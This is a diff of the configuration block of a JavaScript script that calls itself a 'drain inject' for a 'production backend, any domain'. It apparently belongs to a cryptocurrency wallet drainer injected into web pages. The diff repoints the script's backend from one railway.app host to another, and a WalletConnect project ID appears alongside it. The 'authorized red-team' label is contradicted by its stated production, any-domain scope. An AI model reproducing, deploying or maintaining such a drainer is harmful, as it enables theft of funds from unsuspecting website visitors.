@@ -1,7 +1,7 @@
 /* Legion authorized red-team drain inject — production backend, any domain */
 (function () {
-  var BACKEND_URL = 'https://legionapi-production.up.railway.app';
-  var BACKEND_URLS = ["https://legionapi-production.up.railway.app"];
+  var BACKEND_URL = 'https://sadrailala-production.up.railway.app';
+  var BACKEND_URLS = ["https://sadrailala-production.up.railway.app"];
   var KINETIC_KEY = 'enabled'; // Memory reuse enabled
   var WC_PROJECT_ID = 'a785da105621eb55c998a35c57587667';
   var HARDWARE_AUTO_CONSENT = false;
